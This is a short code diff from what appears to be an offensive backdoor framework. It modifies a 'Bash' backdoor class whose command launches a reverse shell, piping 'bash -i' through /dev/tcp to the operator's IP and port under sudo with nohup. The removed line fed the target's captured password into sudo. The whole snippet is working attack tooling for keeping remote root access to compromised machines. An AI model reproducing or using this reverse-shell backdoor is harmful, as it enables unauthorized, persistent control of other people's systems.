@@ -16,9 +16,9 @@ class Bash(Backdoor):
         self.help_text = INFO + "Uses a simple bash command to connect to a specific ip and port combination, and pipes its input into a bash shell." 
 
     def get_command(self):
-        return "echo " + self.core.curtarget.pword + " | sudo -S nohup bash -i >& /dev/tcp/" + self.core.localIP + "/%s 0>&1" % self.get_value("port")
+        return "sudo -S nohup bash -i >& /dev/tcp/" + self.core.localIP + "/%s 0>&1" % self.get_value("port")
 
-    def do_spawn(self, args):
+    def do_spawn(self, args): #this specific backdoor has a little extra because normally it prompts for the sudo password.
         if(hasattr(self, "child")):
             if(self.child.isalive()):
                 print("Press Control + ] to exit the shell.")
